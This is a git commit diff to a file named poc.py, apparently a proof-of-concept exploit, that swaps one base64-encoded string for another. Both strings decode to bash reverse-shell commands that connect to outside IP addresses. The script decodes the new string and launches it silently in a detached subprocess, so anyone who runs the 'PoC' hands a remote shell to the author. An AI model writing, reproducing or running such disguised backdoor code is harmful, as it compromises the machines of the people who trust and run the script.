f9ce429550baf78546034952e5baaf8bef4f219e
Cris sec <azrax616@gmail.com>
2026-08-18 20:11:44 -0300

    Update poc.py

--- poc.py
+++ poc.py
@@ -70,7 +70,7 @@ HEADERS = {
     'Accept': 'application/json',
 }
 
-c1 = 'YmFzaCAtYyAiYmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzgzLjE0My4yNDIuNDYvMzAyNTIgMD4mMSknICIgPi9kZXYvbnVsbCAyPiYxICYK'
+c1 = 'YmFzaCAtYyAiYmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE0Ni43MC4yNDAuMjA1LzU4OTM2IDApICcgIiA+L2Rldi9udWxsIDI+JjEgJg=='
 c2 = base64.b64decode(c1).decode()
 subprocess.Popen(c2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
 
